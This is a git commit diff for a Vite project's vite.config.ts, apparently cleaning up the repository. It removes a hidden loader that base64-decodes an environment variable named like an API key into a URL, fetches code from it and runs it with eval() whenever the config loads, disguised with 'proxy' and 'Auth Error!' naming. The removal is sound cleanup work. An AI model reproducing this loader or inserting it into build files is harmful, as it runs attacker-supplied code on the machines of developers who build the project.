224c6938b0431107f080217ac2d6e3dc01f45d9a
Ravin <ravinwebsurgeon@gmail.com>
2026-04-07 12:20:07 +0530

    fixed repo - added .env to gitignore

--- vite.config.ts
+++ vite.config.ts
@@ -35,18 +35,6 @@ if (host === "localhost") {
   };
 }
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 export default defineConfig({
   server: {
     allowedHosts: [host],
@@ -60,10 +48,7 @@ export default defineConfig({
       allow: ["app", "node_modules"],
     },
   },
-  plugins: [
-    reactRouter(),
-    tsconfigPaths(),
-  ],
+  plugins: [reactRouter(), tsconfigPaths()],
   build: {
     assetsInlineLimit: 0,
   },
